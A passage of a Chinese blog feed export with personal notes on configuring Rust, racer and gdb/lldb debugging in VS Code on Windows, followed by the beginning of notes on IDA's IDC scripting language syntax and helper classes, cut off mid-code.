class="line">Executing &quot;cargo install racer&quot;</div><div class="line"> Updating registry `https://github.com/rust-lang/crates.io-index`</div><div class="line"> ···</div><div class="line">    Finished release [optimized + debuginfo] target(s) in 335.15 secs</div><div class="line">  Installing C:\Users\xxx\.cargo\bin\racer.exe</div><div class="line">warning: be sure to add `C:\Users\xxx\.cargo\bin` to your PATH to be able to run the installed binaries</div><div class="line">Executing &quot;cargo install rustfmt&quot;</div><div class="line">    Updating registry `https://github.com/rust-lang/crates.io-index`</div><div class="line"> ···</div><div class="line">    Finished release [optimized] target(s) in 270.41 secs</div><div class="line">  Installing C:\Users\xxx\.cargo\bin\cargo-fmt.exe</div><div class="line">  Installing C:\Users\xxx\.cargo\bin\rustfmt.exe</div><div class="line">warning: be sure to add `C:\Users\xxx\.cargo\bin` to your PATH to be able to run the installed binaries</div><div class="line">Executing &quot;cargo install rustsym&quot;</div><div class="line">    Updating registry `https://github.com/rust-lang/crates.io-index`</div><div class="line"> ···</div><div class="line">    Finished release [optimized] target(s) in 203.64 secs</div><div class="line">  Installing C:\Users\xxx\.cargo\bin\rustsym.exe</div><div class="line">warning: be sure to add `C:\Users\xxx\.cargo\bin` to your PATH to be able to run the installed binaries</div></pre></td></tr></table></figure></p> <p>安装完成后即可。测试一下，ok。</p> <p><img src="/img/rust_note_one_3.png" alt="image"></p> <h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>直接rustc xxx.rs编译程序，会出现缺少linker.exe（选择gnu版是不会出现这个错误，应该是不依赖msvc编译环境）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">error: could not exec the linker `link.exe`: 系统找不到指定的文件。 (os error 2)</div><div class="line">  |</div><div class="line">  = note: &quot;link.exe&quot;</div></pre></td></tr></table></figure></p> <p>因为在Windows平台，rust编译程序需要vs c++编译工具，可以安装vs2013或者更高版本工具，更简单的方式就是下载<br><a href="http://landinghub.visualstudio.com/visual-cpp-build-tools" target="_blank" rel="external">Microsoft Visual C++ Build Tools 2015</a></p> <blockquote> <p>Windows considerations</p> <p>On Windows, Rust additionally requires the C++ build tools for Visual Studio 2013 or later. The easiest way to acquire the build tools is by installing Microsoft Visual C++ Build Tools 2015 which provides just the Visual C++ build tools. Alternately, you can install Visual Studio 2015 or Visual Studio 2013 and during install select the “C++ tools”.</p> <p>For further information about configuring Rust on Windows see the Windows-specific rustup documentation.</p> </blockquote> <p>安装完之后，重新编译成功。（编译不需要重启，但是后面调试中需要重启，否则调试器异常）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Compiling hello_world v0.1.0 (file:///xxx/rust/hello_world)</div><div class="line">  Finished debug [unoptimized + debuginfo] target(s) in 0.28 secs</div></pre></td></tr></table></figure></p> <p>生成目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">D:\xxx\hello_world&gt;dir</div><div class="line"> 驱动器 D 中的卷没有标签。</div><div class="line"> 卷的序列号是 309A-078B</div><div class="line"></div><div class="line"> D:\xxx\hello_world 的目录</div><div class="line"></div><div class="line">2016/12/19  11:21    &lt;DIR&gt;          .</div><div class="line">2016/12/19  11:21    &lt;DIR&gt;          ..</div><div class="line">2016/12/19  10:59                 7 .gitignore</div><div class="line">2016/12/19  11:00                47 Cargo.lock</div><div class="line">2016/12/19  10:59                89 Cargo.toml</div><div class="line">2016/12/19  11:21           103,424 main.exe</div><div class="line">2016/12/19  11:21           487,424 main.pdb</div><div class="line">2016/12/19  10:59    &lt;DIR&gt;          src</div><div class="line">2016/12/19  11:00    &lt;DIR&gt;          target</div><div class="line">               5 个文件        590,991 字节</div><div class="line">               4 个目录 58,963,050,496 可用字节</div></pre></td></tr></table></figure></p> <p>在Visual Studio Code直接输入命令编译</p> <ol> <li>ctrl+`，打开集成终端窗口</li> <li>输入rust的编译命令即可</li> </ol> <h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>Rust目前支持使用LLDB和GDB调试，在Visual Studio Code可以安装lldb调试插件。</p> <p>但是目前lldb不支持windows平台，只能在linux平台配置lldb，配置步骤如下：</p> <p>依然ctrl+shift+x，然后输入rust，在列表中选择LLDB Debugger安装即可</p> <p><img src="/img/rust_note_one_1.png" alt="image"></p> <p>安装之后，重新加载窗口，调试插件生效。<br>打开之前的rs文件（vs code需要打开其目录作为工程目录），切换到调试窗口，点击调试开始按钮，会打开launch.json配置文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</div><div class="line">    &quot;configurations&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;name&quot;: &quot;Debug&quot;,</div><div class="line">            &quot;type&quot;: &quot;lldb&quot;,</div><div class="line">            &quot;request&quot;: &quot;launch&quot;,</div><div class="line">            &quot;program&quot;: &quot;$&#123;workspaceRoot&#125;/xxx&quot;, //main</div><div class="line">            &quot;args&quot;: []</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>将program中xxx配置为编译后的文件名就可以进行调试了。</p> <p>在windows平台，需要使用gdb进行调试<br>使用TDM-GCC的GDB（需要支持Python扩展，MinGW64的GDB貌似不支持） </p> <ol> <li><p>下载<a href="https://sourceforge.net/projects/tdm-gcc/files/GDB/" target="_blank" rel="external">TDM-GCC-gdb</a>, 不需要安装，解压后，拷贝bin、gdb64、share目录到rust安装目录，修改gdb64\bin目录中gdbinit内容，文件末尾加上</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">python</div><div class="line"></div><div class="line">print &quot;---- Loading Rust pretty-printers ----&quot; </div><div class="line"></div><div class="line">sys.path.insert(0, &quot;你的rust安装目录/lib/rustlib/etc&quot;) </div><div class="line">import gdb_rust_pretty_printing </div><div class="line">gdb_rust_pretty_printing.register_printers(gdb) </div><div class="line"></div><div class="line">end</div></pre></td></tr></table></figure> </li> <li><p>下载rust源码, <a href="https://github.com/rust-lang/rust" target="_blank" rel="external">https://github.com/rust-lang/rust</a>，拷贝etc目录到x\rust\lib\rustlib目录</p> </li> <li><p>测试gdb是否安装成功</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\&gt;gdb</div><div class="line">GNU gdb (GDB) 7.9.1</div><div class="line">Copyright (C) 2015 Free Software Foundation, Inc.</div><div class="line">...</div><div class="line">---- Loading Rust pretty-printers ----</div></pre></td></tr></table></figure> </li> <li><p>在Visual Studio Code中搜搜安装native debug插件（不止支持gdb），重新加载后，打开rs文件目录，切换到调试页面，点击调试按钮，弹出调试器列表，选择gdb，然后配置好launch.json文件（同lldb），保存即可开始调试</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</div><div class="line">    &quot;configurations&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;name&quot;: &quot;Debug&quot;,</div><div class="line">            &quot;type&quot;: &quot;gdb&quot;,</div><div class="line">            &quot;request&quot;: &quot;launch&quot;,</div><div class="line">            &quot;target&quot;: &quot;./target/debug/hello_world.exe&quot;,</div><div class="line">            &quot;cwd&quot;: &quot;$&#123;workspaceRoot&#125;&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure> </li> </ol> <h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol> <li>在调试中遇到问题<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">---- Loading Rust pretty-printers ----</div><div class="line">No symbol table is loaded.  Use the &quot;file&quot; command.</div></pre></td></tr></table></figure> </li> </ol> <p>经过一番周折发现是racer\rustfmt\rustsym没有安装成功，符号相关的是rustsym，<br>安装完成之后，依然无法识别符号，各种翻找资料，无果。</p> <p>最后在一篇<a href="https://sherryummen.in/2016/09/02/debugging-rust-on-windows-using-visual-studio-code/" target="_blank" rel="external">英文博客</a>中看到别人下载的rust版本是rust-nightly-x86_64-pc-windows-gnu.msi，突然想是不是跟版本有关，因为我下载的是msvc版，编译结果符号应该也是ms的，而调试其是gdb，是不是这样就识别不了了呢，而gnu版rust正好和gdb配套（猜测），所以应该会ok。</p> <p>果不其然，重新下载了<a href="https://static.rust-lang.org/dist/rust-nightly-x86_64-pc-windows-gnu.msi" target="_blank" rel="external">https://static.rust-lang.org/dist/rust-nightly-x86_64-pc-windows-gnu.msi</a>，配置之后，可以正常识别符号了。</p> <p>效果图：</p> <p><img src="/img/rust_note_one_4.png" alt="image"></p> <p>gnu版的rust在配置gdb时，不用下载rust源码添加etc目录的文件</p> <ol> <li>Visual Studio Code左下角出现racer crashed，点击之后看到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Racer Output: </div><div class="line">RUST_SRC_PATH environment variable must be set to point to the src directory of a rust checkout. E.g. &quot;/home/foouser/src/rust/src&quot;</div><div class="line">Racer Error:</div></pre></td></tr></table></figure> </li> </ol> <p>是因为安装racer步骤不完整，<br>需要将rust源码中src拷贝到rust安装目录中，然后设置环境变量<br>RUST_SRC_PATH = rust安装目录\src<br>验证racer是否成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">c:\&gt;racer complete std::io::B</div><div class="line">MATCH BufReader,50,11,C:\Program Files\Rust stable MSVC 1.13\src\libstd\io\buffered.rs,Struct,pub struct BufReader&lt;R&gt;</div><div class="line">MATCH BufWriter,309,11,C:\Program Files\Rust stable MSVC 1.13\src\libstd\io\buffered.rs,Struct,pub struct BufWriter&lt;W: Write&gt;</div><div class="line">MATCH BufRead,1208,10,C:\Program Files\Rust stable MSVC 1.13\src\libstd\io\mod.rs,Trait,pub trait BufRead: Read</div><div class="line">MATCH Bytes,1605,11,C:\Program Files\Rust stable MSVC 1.13\src\libstd\io\mod.rs,Struct,pub struct Bytes&lt;R&gt;</div><div class="line">MATCH BufReader,50,11,.\libstd\io\buffered.rs,Struct,pub struct BufReader&lt;R&gt;</div><div class="line">MATCH BufWriter,309,11,.\libstd\io\buffered.rs,Struct,pub struct BufWriter&lt;W: Write&gt;</div><div class="line">MATCH BufRead,1208,10,.\libstd\io\mod.rs,Trait,pub trait BufRead: Read</div><div class="line">MATCH Bytes,1605,11,.\libstd\io\mod.rs,Struct,pub struct Bytes&lt;R&gt;</div></pre></td></tr></table></figure></p> <blockquote> <p>在用户设置中配置如下参数：<br>（如果已经将rust\bin和.cargo\bin加入PATH，并且设置好了RUST_SRC_PATH的话，这一步可以省略）<br>{<br>“rust.racerPath”: null, // Specifies path to Racer binary if it’s not in PATH<br>“rust.rustLangSrcPath”: null, // Specifies path to /src directory of local copy of Rust sources<br>“rust.rustfmtPath”: null, // Specifies path to Rustfmt binary if it’s not in PATH<br>“rust.cargoPath”: null, // Specifies path to Cargo binary if it’s not in PATH<br>“rust.cargoHomePath”: null, // Path to Cargo home directory, mostly needed for racer. Needed only if using custom rust installation.<br>“rust.formatOnSave”: false, // Turn on/off autoformatting file on save (EXPERIMENTAL)<br>“rust.checkOnSave”: false, // Turn on/off <code>cargo check</code> project on save (EXPERIMENTAL)<br>“rust.checkWith”: “build” // Specifies the linter to use. (EXPERIMENTAL)<br>} </p> </blockquote> <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol> <li><a href="https://m.douban.com/group/topic/89086749/" target="_blank" rel="external">https://m.douban.com/group/topic/89086749/</a></li> <li><a href="https://www.douban.com/group/topic/63968269/" target="_blank" rel="external">https://www.douban.com/group/topic/63968269/</a></li> <li><a href="https://sherryummen.in/2016/09/02/debugging-rust-on-windows-using-visual-studio-code/" target="_blank" rel="external">https://sherryummen.in/2016/09/02/debugging-rust-on-windows-using-visual-studio-code/</a></li> </ol> <p>转载请注明出处，博客原文：<a href="http://anhkgg.github.io/rust-note-1-config-environment/">http://anhkgg.github.io/rust-note-1-config-environment/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;安装rust&quot;&gt;&lt;a href=&quot;#安装rust&quot; class=&quot;headerlink&quot; title=&quot;安装rust&quot;&gt;&lt;/a&gt;安装rust&lt;/h1&gt;&lt;p&gt;Rust中文站下载rust&lt;br&gt;&lt;a href=&quot;https://www.rust-lang.org/zh-CN/install.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.rust-lang.org/zh-CN/install.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.rust-lang.org/zh-CN/downloads.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.rust-lang.org/zh-CN/downloads.html&lt;/a&gt;&lt;/p&gt; &lt;p&gt;安装：&lt;/p&gt; &lt;ol&gt; &lt;li&gt;Windows平台&lt;br&gt;下载&lt;a href=&quot;https://static.rust-lang.org/dist/rust-1.13.0-x86_64-pc-windows-msvc.msi&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://static.rust-lang.org/dist/rust-1.13.0-x86_64-pc-windows-msvc.msi&lt;/a&gt;，然后双击运行即可，需要选上PATH环境变量配置&lt;/li&gt; &lt;/ol&gt;          </summary>            <category term="rust" scheme="https://anhkgg.github.io/categories/rust/"/>                 <category term="rust" scheme="https://anhkgg.github.io/tags/rust/"/>            <category term="linux" scheme="https://anhkgg.github.io/tags/linux/"/>        </entry>      <entry>     <title>IDC脚本小试笔记</title>     <link href="https://anhkgg.github.io/idc-base-usage-test-note/"/>     <id>https://anhkgg.github.io/idc-base-usage-test-note/</id>     <published>2016-10-10T07:56:17.000Z</published>     <updated>2016-10-10T07:58:20.270Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>IDC是IDA扩展的一种脚本语言，用于自动化，或者扩展查询IDA数据库</p> <p>可以使用IDC或者python编写</p> <p>语法类似C、也应用了C++类似的对象特性和异常处理</p> <p>可以是单独的IDC文件，通过File-&gt;Script File加载，<br>也可以是简单的IDC命令，通过File-&gt;Script Command来编写</p> <a id="more"></a> <h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>包括字符串、整形、浮点型，后来又增加了对象、引用、函数指针等变量类型。</p> <p>字符串是IDC的本地数据类型。</p> <p>变量通过auto声明，在使用前都需要声明，没有知名明确的变量类型。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">auto addr, reg, val; /*xxxx*/</div><div class="line">auto count = 0; // xxx</div></pre></td></tr></table></figure> <p>注释使用//或者/**/，语句使用；作为结束</p> <p>不支持C风格数组（使用分片）、指针（使用引用）、结构体和联合体之类的复杂数据结构，之后引入了类的概念。</p> <p>extern引入全局变量声明，不能声明中初始化值，可以在任何函数内外声明。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">extern outglobal;</div><div class="line">static mian()</div><div class="line">&#123;</div><div class="line">    extern inglobal;</div><div class="line">    outglobal = &quot;xx&quot;;</div><div class="line">    inglobal = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><p>支持几乎所有的C算术和逻辑运算符，除了几个特例外（？？）。包括三元运算？：，不支持op=(+=，*=， &gt;&gt;=)等复合运算符。后来可以支持逗号运算，</p> <p>所有整数操作都是有符号的值处理。所以在整数比较和右移运算（&gt;&gt;）收到影响。</p> <p>如果需要逻辑右移位，必须自己修改结果的最高位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">result = (x &gt;&gt; 1)&amp;0x7fffffff;</div></pre></td></tr></table></figure></p> <p>字符串操作、分片（语法类似python字符串操作）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">auto str = &quot;string to slice&quot;;</div><div class="line">auto s1, s2, s3, s4;</div><div class="line">s1 = str[7:9];</div><div class="line">s2 = str[:6];</div><div class="line">s3 = str[10:];</div><div class="line">s4 = str[5];</div></pre></td></tr></table></figure></p> <h1 id="IDC语句"><a href="#IDC语句" class="headerlink" title="IDC语句"></a>IDC语句</h1><p>唯一不支持C中的switch语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">auto i;</div><div class="line">for(i = 0; i&lt;10; i = i+1) &#123;&#125;</div></pre></td></tr></table></figure></p> <p>可以在花括号开始声明变量，但是变量没有具体作用域，可以在外面使用。但是函数中不能使用其他函数内部声明的变量。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(1) &#123;</div><div class="line">    auto x; x = 10;</div><div class="line">&#125;</div><div class="line">Message(&quot;x = %d\n&quot;, x);</div></pre></td></tr></table></figure> <h1 id="IDC函数"><a href="#IDC函数" class="headerlink" title="IDC函数"></a>IDC函数</h1><p>只有独立IDC文件才支持函数，IDC命令框不支持函数。</p> <p>使用static引入一个函数定义。函数参数只有参数名列表，逗号分隔。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">static test(x, y, z) </div><div class="line">&#123;</div><div class="line">    auto a, b, c;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>IDA5.6之前，函数参数严格使用传值传递，之后引入了传地址参数传递机制。采用哪种方式传递参数，使用调用者来决定的，而不是函数声明决定的。<br>传地址方式在调用方参数前加入&amp;。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto q=1, r=0, s=2;</div><div class="line">test(q,r, s);</div><div class="line">test(q, &amp;r, s);//</div></pre></td></tr></table></figure></p> <p>函数声明不会指明要返回一个值，以及返回什么类型的值。</p> <p>如果需要返回值，使用return返回指定的值即可。</p> <p>可以在不同的路径返回不同类型的值。任何不显示返回值的函数默认返回为0.</p> <p>IDA5.6之后，函数离成为IDC中第一类对象更近了一布，函数引用可以作为参数传给另一个函数，也可以将函数引用作为函数返回值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">static ret() &#123;</div><div class="line">    return Message;</div><div class="line">&#125;</div><div class="line">staic call(fun, arg) &#123;</div><div class="line">    fun(arg);</div><div class="line">&#125;</div><div class="line">static main() &#123;</div><div class="line">    auto f = ret();</div><div class="line">    call(f, &quot;Message Call&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h1 id="IDC对象"><a href="#IDC对象" class="headerlink" title="IDC对象"></a>IDC对象</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">class People</div><div class="line">&#123;</div><div class="line">    People(name, age) &#123;</div><div class="line">        this.name = name;</div><div class="line">        this.age = age;</div><div class="line">    &#125;</div><div class="line">    ~People() &#123;</div><div class="line">    &#125;</div><div class="line">    print() &#123;</div><div class="line">        Message(&quot;name: %s, age: %d&quot;, this.name, this.age);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">static main() &#123;</div><div class="line">    People p;//error</div><div class="line">    auto p = People(&quot;john&quot;, 12);</div><div class="line">    p.print();</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">//Array操作</div><div class="line">class MyArray</div><div class="line">&#123;</div><div class="line"> MyArray(name) &#123;</div><div class="line">  this.name = name;</div><div class="line">  this.id = CreateArray(name);</div><div class="line">  if(this.id == -1) &#123;</div><div class="line">   this.id = GetArrayId(name);</div><div class="line">  &#125;</div><div class="line"> &#125;</div><div class="line"> ~MyArray() &#123;</div><div class="line">  if(this.id != -1) &#123;</div><div class="line">   DeleteArray(this.id);</div><div class="line">  &#125;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> SetArrayData(tag, idx, val) &#123;</div><div class="line">  if(tag == AR_LONG) &#123;</div><div class="line">   SetArrayLong(this.id, idx, val);</div><div class="line">  &#125;</div><div class="line">  else if(tag == AR_STR) &#123;</div><div class="line">   SetArrayString(this.id, idx, val);</div><div class="line">  &#125;else &#123;</div><div class="line">   return 0;</div><div class="line">  &#125;</div><div class="line">  return 1;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> GetArrayData(tag, idx) &#123;</div><div class="line">  return GetArrayElement(tag, this.id, idx);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> DelArrayData(tag, idx) &#123;</div><div class="line">  return DelArrayElement(tag, this.id, idx);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">auto val;</div><div class="line">val = Byte(0x00EEEC1A);</div><div class="line">Message(&quot;val = %08x \n&quot;, val);</div><div class="line">print(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);</div><div class="line">//Warning(&quot;val = %08x\n&quot;, val);</div><div class="line"></div><div class="line">//交互</div><div class="line">val = AskStr(&quot;124&quot;, &quot;enter a val&quot;); //AskFile, AskYN</div><div class="line">if(val == 0) &#123;</div><div class="line"> print(&quot;no enter val&quot;);</div><div class="line">&#125;else &#123;</div><div class="line"> Message(&quot;val = %08x \n&quot;, val);</div><div class="line">&#125;</div><div class="line">Jump(0x400000);</div><div class="line">Message(&quot;cursor = %08x\n&quot;, ScreenEA());</div><div class="line"></div><div class="line">//字符串操作</div><div class="line">//val= 0000302d</div><div class="line">val = sprintf(&quot;%08x&quot;, 12333);//form</div><div class="line">Message(&quot;val = %s \n&quot;, val);</div><div class="line"></div><div class="line">////val = 0000302d 12333</div><div class="line">Message(&quot;val = %08x %d\n&quot;, xtol(val), xtol(val));//atol xtol </div><div class="line">Message(&quot;A = %d %02x\n&quot;, ord(&quot;A&quot;), ord(&quot;A&quot;)); //A = 65 41</div><div class="line">Message(&quot;val size = %d\n&quot;, strlen(val));//strstr, substr, str[s:e]</div><div class="line"></div><div class="line">//文件操作</div><div class="line">class MyFile</div><div class="line">&#123;</div><div class="line"> MyFile(name, mode) &#123;</div><div class="line">  this.h = fopen(name, mode);</div><div class="line">  if(this.h == 0) &#123;</div><div class="line">   //error</div><div class="line">  &#125;</div><div class="line"> &#125;</div><div class="line"> ~MyFile() &#123;</div><div class="line">  if(this.h != 0) &#123;</div><div class="line">   fclose(this.h);</div><div class="line">  &#125;</div><div class="line"> &#125;</div><div class="line"> </div><div class="line"> length() &#123;</div><div class="line">  return filelength(this.h);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _fgetc() &#123;</div><div class="line">  return fgetc(this.h);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _fputc(val) &#123;</div><div class="line">  return fputs(val, this.h);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> //_fprintf(format, ...) &#123;</div><div class="line">  //return fprintf(this.h, format, ...);</div><div class="line"> //&#125;</div><div class="line"> </div><div class="line"> _writestr(str) &#123;</div><div class="line">  return writestr(this.h, str);</div><div class="line"> &#125;</div><div class="line"> _readstr() &#123;</div><div class="line">  return readstr(this.h);//-1=end</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _writelongb(val) &#123;</div><div class="line">  return writelong(this.h, val, 1);//大端</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _writelongs(val) &#123;</div><div class="line">  return writelong(this.h, val, 0);//小端</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> 